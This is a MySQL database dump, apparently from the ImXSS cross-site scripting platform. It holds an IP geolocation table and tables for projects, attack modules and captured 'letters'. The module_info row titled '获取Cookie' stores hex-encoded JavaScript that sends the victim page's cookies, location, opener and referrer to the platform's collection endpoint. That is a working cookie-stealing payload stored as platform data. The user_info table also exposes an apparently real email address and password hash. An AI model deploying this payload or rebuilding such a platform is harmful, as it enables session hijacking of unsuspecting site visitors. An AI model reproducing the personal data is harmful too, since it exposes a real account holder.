INSERT INTO `address_info` VALUES ('59.41.205.86', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.21.222', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.22.205', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.41.92.80', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.42.109.129', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.42.239.121', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.42.26.79', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('59.54.106.38', '中国', '华东', '江西省', '九江市', '电信');
INSERT INTO `address_info` VALUES ('59.61.172.225', '中国', '华东', '福建省', '福州市', '电信');
INSERT INTO `address_info` VALUES ('59.78.209.100', '中国', '华东', '上海市', '上海市', '教育网');
INSERT INTO `address_info` VALUES ('60.16.250.29', '中国', '东北', '辽宁省', '沈阳市', '联通');
INSERT INTO `address_info` VALUES ('60.163.149.254', '中国', '华东', '浙江省', '嘉兴市', '电信');
INSERT INTO `address_info` VALUES ('60.169.124.103', '中国', '华东', '安徽省', '芜湖市', '电信');
INSERT INTO `address_info` VALUES ('60.173.254.206', '中国', '华东', '安徽省', '合肥市', '电信');
INSERT INTO `address_info` VALUES ('60.211.225.247', '中国', '华东', '山东省', '济宁市', '联通');
INSERT INTO `address_info` VALUES ('60.212.25.195', '中国', '华东', '山东省', '烟台市', '联通');
INSERT INTO `address_info` VALUES ('60.8.202.142', '中国', '华北', '河北省', '张家口市', '联通');
INSERT INTO `address_info` VALUES ('61.136.204.186', '中国', '华中', '湖北省', '恩施土家族苗族自治州', '电信');
INSERT INTO `address_info` VALUES ('61.136.246.137', '中国', '华中', '湖北省', '孝感市', '电信');
INSERT INTO `address_info` VALUES ('61.136.246.194', '中国', '华中', '湖北省', '孝感市', '电信');
INSERT INTO `address_info` VALUES ('61.136.246.36', '中国', '华中', '湖北省', '孝感市', '电信');
INSERT INTO `address_info` VALUES ('61.140.233.56', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('61.140.94.231', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('61.140.94.88', '中国', '华南', '广东省', '广州市', '电信');
INSERT INTO `address_info` VALUES ('61.147.199.17', '中国', '华东', '江苏省', '南通市', '电信');
INSERT INTO `address_info` VALUES ('61.147.247.150', '中国', '华东', '江苏省', '宿迁市', '电信');
INSERT INTO `address_info` VALUES ('61.151.218.119', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('61.151.226.16', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('61.151.226.191', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('61.151.226.199', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('61.151.228.22', '中国', '华东', '上海市', '上海市', '电信');
INSERT INTO `address_info` VALUES ('61.158.148.5', '中国', '华中', '河南省', '开封市', '联通');
INSERT INTO `address_info` VALUES ('61.162.225.186', '中国', '华东', '山东省', '日照市', '联通');
INSERT INTO `address_info` VALUES ('61.163.118.214', '中国', '华中', '河南省', '新乡市', '联通');
INSERT INTO `address_info` VALUES ('61.178.208.93', '中国', '西北', '甘肃省', '张掖市', '电信');
INSERT INTO `address_info` VALUES ('61.184.196.84', '中国', '华中', '湖北省', '荆门市', '电信');
INSERT INTO `address_info` VALUES ('61.184.240.185', '中国', '华中', '湖北省', '省直辖县级行政区划', '电信');
INSERT INTO `address_info` VALUES ('61.186.23.149', '中国', '华南', '海南省', '省直辖县级行政区划', '电信');
INSERT INTO `address_info` VALUES ('61.186.24.36', '中国', '华南', '海南省', '省直辖县级行政区划', '电信');
INSERT INTO `address_info` VALUES ('61.49.241.189', '中国', '华北', '北京市', '北京市', '联通');
INSERT INTO `address_info` VALUES ('61.70.154.164', '台湾', '', '台湾省', '', 'Hurricane Electric');
INSERT INTO `address_info` VALUES ('88.99.68.199', '英国', '', '', '', '');

-- ----------------------------
-- Table structure for email_info
-- ----------------------------
DROP TABLE IF EXISTS `email_info`;
CREATE TABLE `email_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `smtp` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `email` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `password` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `sendNum` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=41 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of email_info
-- ----------------------------

-- ----------------------------
-- Table structure for email_queue
-- ----------------------------
DROP TABLE IF EXISTS `email_queue`;
CREATE TABLE `email_queue` (
  `unionId` varchar(32) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `context` varchar(2048) DEFAULT NULL,
  `targeEmail` varchar(64) DEFAULT NULL,
  `status` int(11) DEFAULT '0',
  `createTime` datetime DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  `millisecond` bigint(32) DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`unionId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of email_queue
-- ----------------------------

-- ----------------------------
-- Table structure for invite_info
-- ----------------------------
DROP TABLE IF EXISTS `invite_info`;
CREATE TABLE `invite_info` (
  `inviteCode` varchar(32) COLLATE utf8_bin NOT NULL,
  `userId` int(11) DEFAULT NULL,
  `status` int(1) DEFAULT '0',
  `updateTime` datetime DEFAULT NULL,
  PRIMARY KEY (`inviteCode`),
  KEY `invite_user_id_fk` (`userId`),
  KEY `invite_code_index` (`inviteCode`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of invite_info
-- ----------------------------

-- ----------------------------
-- Table structure for letter_info
-- ----------------------------
DROP TABLE IF EXISTS `letter_info`;
CREATE TABLE `letter_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `projectId` int(11) DEFAULT NULL,
  `refUrl` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL,
  `unionId` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `ip` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `userId` int(11) NOT NULL,
  `isReaded` int(1) DEFAULT '0',
  `moduleId` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `letter_unionId_index` (`unionId`) USING BTREE,
  KEY `letter_project_id_fk` (`projectId`) USING BTREE,
  KEY `letter_userId_index` (`userId`),
  FULLTEXT KEY `letter_refurl_index` (`refUrl`)
) ENGINE=InnoDB AUTO_INCREMENT=2667 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of letter_info
-- ----------------------------

-- ----------------------------
-- Table structure for letter_paras
-- ----------------------------
DROP TABLE IF EXISTS `letter_paras`;
CREATE TABLE `letter_paras` (
  `paraName` varchar(255) COLLATE utf8_bin NOT NULL,
  `letterId` int(11) NOT NULL,
  `paraValue` text COLLATE utf8_bin,
  `updateTime` datetime DEFAULT NULL,
  PRIMARY KEY (`paraName`,`letterId`),
  KEY `paras_letter_id` (`letterId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of letter_paras
-- ----------------------------

-- ----------------------------
-- Table structure for module_info
-- ----------------------------
DROP TABLE IF EXISTS `module_info`;
CREATE TABLE `module_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) DEFAULT NULL,
  `remark` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `content` text COLLATE utf8_bin,
  `type` int(11) DEFAULT '0',
  `updateTime` datetime DEFAULT NULL,
  `title` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `module_id_index` (`id`),
  KEY `module_type_index` (`type`),
  KEY `module_all_index` (`userId`,`type`)
) ENGINE=InnoDB AUTO_INCREMENT=70 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of module_info
-- ----------------------------
INSERT INTO `module_info` VALUES ('37', '0', '获取Cookie', 0x7661722078203D206E657720496D61676528293B0D0A747279207B0D0A09766172206D796F70656E6572203D2027273B0D0A096D796F70656E6572203D2077696E646F772E6F70656E65722026262077696E646F772E6F70656E65722E6C6F636174696F6E203F2077696E646F772E6F70656E65722E6C6F636174696F6E0D0A0909093A2027273B0D0A7D206361746368202865727229207B0D0A7D0D0A782E737263203D20277B6170697D3F6C6F636174696F6E3D270D0A09092B2065736361706528646F63756D656E742E6C6F636174696F6E29202B202726746F706C6F636174696F6E3D270D0A09092B2065736361706528746F702E646F63756D656E742E6C6F636174696F6E29202B202726636F6F6B69653D27202B2065736361706528646F63756D656E742E636F6F6B6965290D0A09092B2027266F70656E65723D27202B20657363617065286D796F70656E657229202B20272672656665727265723D270D0A09092B2065736361706528646F63756D656E742E7265666572726572293B, '1', '2017-07-14 08:32:33', '获取Cookie');

-- ----------------------------
-- Table structure for project_info
-- ----------------------------
DROP TABLE IF EXISTS `project_info`;
CREATE TABLE `project_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `moduleId` int(11) DEFAULT NULL,
  `userId` int(11) DEFAULT NULL,
  `title` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `remark` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL,
  `uri` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `sortUri` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `openMobile` int(1) DEFAULT '0',
  `openEmail` int(1) DEFAULT '0',
  `ignoreRef` varchar(2048) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `project_module_id_fk` (`moduleId`) USING BTREE,
  KEY `project_user_id_fk` (`userId`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=348 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of project_info
-- ----------------------------

-- ----------------------------
-- Table structure for project_module_mapping
-- ----------------------------
DROP TABLE IF EXISTS `project_module_mapping`;
CREATE TABLE `project_module_mapping` (
  `projectId` int(11) NOT NULL,
  `moduleId` int(11) NOT NULL,
  `mappingUrl` varchar(255) COLLATE utf8_bin NOT NULL,
  `userId` int(11) NOT NULL,
  `id` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`mappingUrl`,`projectId`),
  UNIQUE KEY `mapping_id_index` (`id`) USING BTREE,
  KEY `mappingUrl_index` (`mappingUrl`),
  KEY `mappingUrl_user_index` (`mappingUrl`,`userId`),
  KEY `mappingUrl_user_project_index` (`projectId`,`mappingUrl`,`userId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of project_module_mapping
-- ----------------------------

-- ----------------------------
-- Table structure for setting_info
-- ----------------------------
DROP TABLE IF EXISTS `setting_info`;
CREATE TABLE `setting_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `siteName` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `keywords` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `description` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `copyright` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `openReg` int(1) DEFAULT '1' COMMENT '0未开启 1开启',
  `needInvite` int(1) DEFAULT '0' COMMENT '0不需要 1需要',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of setting_info
-- ----------------------------
INSERT INTO `setting_info` VALUES ('1', 'ImXSS 国内最专业的Xss渗透测试平台', '国内最专业的Xss渗透测试平台  --ImXSS', 'ImXss为etrick研发且开源。是国内最专业的Xss渗透平台', 'Copyright © 2014-2019 Scrum Group 版权所有', '1', '0');

-- ----------------------------
-- Table structure for suffix_info
-- ----------------------------
DROP TABLE IF EXISTS `suffix_info`;
CREATE TABLE `suffix_info` (
  `suffix` varchar(255) NOT NULL,
  `status` int(1) DEFAULT NULL,
  PRIMARY KEY (`suffix`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of suffix_info
-- ----------------------------
INSERT INTO `suffix_info` VALUES ('action', '0');
INSERT INTO `suffix_info` VALUES ('admin', '0');
INSERT INTO `suffix_info` VALUES ('asa', '0');
INSERT INTO `suffix_info` VALUES ('asax', '0');
INSERT INTO `suffix_info` VALUES ('ascx', '0');
INSERT INTO `suffix_info` VALUES ('ashx', '0');
INSERT INTO `suffix_info` VALUES ('asp', '0');
INSERT INTO `suffix_info` VALUES ('aspx', '0');
INSERT INTO `suffix_info` VALUES ('bat', '0');
INSERT INTO `suffix_info` VALUES ('cer', '0');
INSERT INTO `suffix_info` VALUES ('cgi', '0');
INSERT INTO `suffix_info` VALUES ('cgix', '0');
INSERT INTO `suffix_info` VALUES ('cmd', '0');
INSERT INTO `suffix_info` VALUES ('com', '0');
INSERT INTO `suffix_info` VALUES ('csp', '0');
INSERT INTO `suffix_info` VALUES ('csrf', '0');
INSERT INTO `suffix_info` VALUES ('cssx', '0');
INSERT INTO `suffix_info` VALUES ('do', '0');
INSERT INTO `suffix_info` VALUES ('edu', '0');
INSERT INTO `suffix_info` VALUES ('esp', '2');
INSERT INTO `suffix_info` VALUES ('exe', '0');
INSERT INTO `suffix_info` VALUES ('exec', '0');
INSERT INTO `suffix_info` VALUES ('exp', '0');
INSERT INTO `suffix_info` VALUES ('fsp', '0');
INSERT INTO `suffix_info` VALUES ('ftl', '0');
INSERT INTO `suffix_info` VALUES ('gifx', '0');
INSERT INTO `suffix_info` VALUES ('gov', '0');
INSERT INTO `suffix_info` VALUES ('htm', '0');
INSERT INTO `suffix_info` VALUES ('html', '0');
INSERT INTO `suffix_info` VALUES ('iis', '0');
INSERT INTO `suffix_info` VALUES ('jhtml', '0');
INSERT INTO `suffix_info` VALUES ('jpgx', '0');
INSERT INTO `suffix_info` VALUES ('jshx', '0');
INSERT INTO `suffix_info` VALUES ('jspx', '0');
INSERT INTO `suffix_info` VALUES ('jsx', '0');
INSERT INTO `suffix_info` VALUES ('mspx', '0');
INSERT INTO `suffix_info` VALUES ('org', '0');
INSERT INTO `suffix_info` VALUES ('php', '0');
INSERT INTO `suffix_info` VALUES ('phpx', '0');
INSERT INTO `suffix_info` VALUES ('pngx', '0');
INSERT INTO `suffix_info` VALUES ('psp', '0');
INSERT INTO `suffix_info` VALUES ('py', '0');
INSERT INTO `suffix_info` VALUES ('sb', '0');
INSERT INTO `suffix_info` VALUES ('ser', '0');
INSERT INTO `suffix_info` VALUES ('shell', '0');
INSERT INTO `suffix_info` VALUES ('shtml', '0');
INSERT INTO `suffix_info` VALUES ('sos', '0');
INSERT INTO `suffix_info` VALUES ('swf', '0');
INSERT INTO `suffix_info` VALUES ('tmp', '0');
INSERT INTO `suffix_info` VALUES ('txt', '0');
INSERT INTO `suffix_info` VALUES ('vbe', '0');
INSERT INTO `suffix_info` VALUES ('vbs', '0');
INSERT INTO `suffix_info` VALUES ('xhtml', '0');
INSERT INTO `suffix_info` VALUES ('xml', '0');
INSERT INTO `suffix_info` VALUES ('xsp', '0');
INSERT INTO `suffix_info` VALUES ('xss', '0');

-- ----------------------------
-- Table structure for suffix_static
-- ----------------------------
DROP TABLE IF EXISTS `suffix_static`;
CREATE TABLE `suffix_static` (
  `id` int(8) NOT NULL AUTO_INCREMENT,
  `suffix` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of suffix_static
-- ----------------------------
INSERT INTO `suffix_static` VALUES ('1', 'css');
INSERT INTO `suffix_static` VALUES ('2', 'js');
INSERT INTO `suffix_static` VALUES ('3', 'jpg');
INSERT INTO `suffix_static` VALUES ('4', 'gif');
INSERT INTO `suffix_static` VALUES ('5', 'bmp');
INSERT INTO `suffix_static` VALUES ('6', 'ico');
INSERT INTO `suffix_static` VALUES ('7', 'txt');
INSERT INTO `suffix_static` VALUES ('8', 'exe');
INSERT INTO `suffix_static` VALUES ('9', 'zip');
INSERT INTO `suffix_static` VALUES ('10', 'rar');
INSERT INTO `suffix_static` VALUES ('11', '7z');
INSERT INTO `suffix_static` VALUES ('12', 'jpeg');
INSERT INTO `suffix_static` VALUES ('13', 'png');
INSERT INTO `suffix_static` VALUES ('14', 'doc');
INSERT INTO `suffix_static` VALUES ('15', 'ppt');
INSERT INTO `suffix_static` VALUES ('16', 'avi');
INSERT INTO `suffix_static` VALUES ('17', 'mp4');
INSERT INTO `suffix_static` VALUES ('18', 'rmvb');
INSERT INTO `suffix_static` VALUES ('19', 'flv');
INSERT INTO `suffix_static` VALUES ('20', 'woff');
INSERT INTO `suffix_static` VALUES ('21', 'woff2');
INSERT INTO `suffix_static` VALUES ('22', 'eot');
INSERT INTO `suffix_static` VALUES ('23', 'svg');
INSERT INTO `suffix_static` VALUES ('24', 'ttf');
INSERT INTO `suffix_static` VALUES ('25', 'otf');

-- ----------------------------
-- Table structure for sys_menus
-- ----------------------------
DROP TABLE IF EXISTS `sys_menus`;
CREATE TABLE `sys_menus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(64) DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  `type` int(1) DEFAULT '0',
  `upId` int(11) DEFAULT NULL,
  `seq` int(11) DEFAULT NULL,
  `code` varchar(128) DEFAULT NULL,
  `remark` varchar(1024) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `menu_upId_fk` (`upId`),
  CONSTRAINT `menu_upId_fk` FOREIGN KEY (`upId`) REFERENCES `sys_menus` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=65 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of sys_menus
-- ----------------------------
INSERT INTO `sys_menus` VALUES ('4', '调试中心', '#', '0', null, '4', null, null);
INSERT INTO `sys_menus` VALUES ('28', '运行状态', 'admin/simple/index', '1', '4', '1', 'index', '后台管理首页');
INSERT INTO `sys_menus` VALUES ('29', '资源管理', 'admin/simple/resources', '1', '4', '1', 'resources', '对项目文件进行管理');
INSERT INTO `sys_menus` VALUES ('30', '监听管理', 'admin/simple/monitorList', '1', '4', '2', 'monitorSetting', '对项目方法进行监听');
INSERT INTO `sys_menus` VALUES ('32', '缓存管理', 'admin/simple/cacheManage', '1', '4', '4', 'cacheSetting', '对系统缓存进行清理');
INSERT INTO `sys_menus` VALUES ('48', '用户中心', '#', '0', null, '0', '', '会员中心相关管理');
INSERT INTO `sys_menus` VALUES ('49', '个人设置', 'user/userSetting', '1', '48', '0', 'userSetting', '用户资料修改');
INSERT INTO `sys_menus` VALUES ('50', '信封管理', 'user/letter/letterCenter', '1', '48', '1', 'letterCenter', '信封管理');
INSERT INTO `sys_menus` VALUES ('51', '项目管理', 'user/project/projectCenter', '1', '48', '2', 'projectCenter', '项目管理');
INSERT INTO `sys_menus` VALUES ('52', '模块管理', 'user/module/moduleCenter', '1', '48', '3', 'moduleCenter', '模块管理');
INSERT INTO `sys_menus` VALUES ('53', '公共邮箱', 'user/email/emailCenter', '1', '54', '1', 'emailCenter', '系统公用发信邮箱');
INSERT INTO `sys_menus` VALUES ('54', '公共信息', '#', '0', null, '0', null, null);
INSERT INTO `sys_menus` VALUES ('55', '公共模块', 'user/module/moduleComm', '1', '54', '3', 'moduleComm', '系统公用模块');
INSERT INTO `sys_menus` VALUES ('56', '管理中心', '#', '0', null, '3', '', '管理员模块');
INSERT INTO `sys_menus` VALUES ('57', '用户管理', 'admin/user/userManage', '1', '56', '3', 'userManage', '用户管理');
INSERT INTO `sys_menus` VALUES ('58', '项目管理', 'admin/project/projectManage', '1', '56', '4', 'projectManage', '项目管理');
INSERT INTO `sys_menus` VALUES ('59', '模块管理', 'admin/module/moduleManage', '1', '56', '5', 'moduleManage', '模块管理');
INSERT INTO `sys_menus` VALUES ('60', '信封管理', 'admin/letter/letterManage', '1', '56', '6', 'letterManage', '信封管理');
INSERT INTO `sys_menus` VALUES ('61', '邀请码库', 'admin/invite/inviteManage', '1', '56', '2', 'inviteManage', '邀请码管理');
INSERT INTO `sys_menus` VALUES ('62', '系统设置', 'admin/setting/settingManage', '1', '56', '0', 'settingManage', '系统设置');
INSERT INTO `sys_menus` VALUES ('63', '邮箱管理', 'admin/email/emailManage', '1', '56', '0', 'emailManage', '模块管理');
INSERT INTO `sys_menus` VALUES ('64', '后缀设置', 'admin/suffix/suffixManage', '1', '56', '1', 'suffixManage', '后缀设置');

-- ----------------------------
-- Table structure for user_info
-- ----------------------------
DROP TABLE IF EXISTS `user_info`;
CREATE TABLE `user_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userPwd` varchar(40) COLLATE utf8_bin DEFAULT NULL,
  `mobile` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `email` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `createTime` datetime DEFAULT NULL,
  `status` int(1) NOT NULL DEFAULT '0',
  `roleId` int(11) NOT NULL DEFAULT '0',
  `logo` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `nickName` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `smtp` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `sendEmail` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `sendPwd` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_mobile_index` (`mobile`) USING BTREE,
  UNIQUE KEY `user_email_index` (`email`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=737 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of user_info
-- ----------------------------
INSERT INTO `user_info` VALUES ('477', 'd70488316f90e4b3b14f532f197adfa8', null, '644556636@qq.com', '2017-07-14 04:11:59', '0', '1', '', 'moody', '', '', '');

-- ----------------------------
-- Table structure for user_role
-- ----------------------------
DROP TABLE IF EXISTS `user_role`;
CREATE TABLE `user_role` (
  `id` int(11) NOT NULL,
  `name` varchar(64) DEFAULT NULL,
  `menus` varchar(1024) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of user_role
-- ----------------------------
INSERT INTO `user_role` VALUES ('0', '会员', '48,49,50,51,52,53,55,54');
INSERT INTO `user_role` VALUES ('1', '管理员', '4,28,29,30,32,48,49,50,51,52,53,55,54,56,57,58,59,60,61,62,64,63');
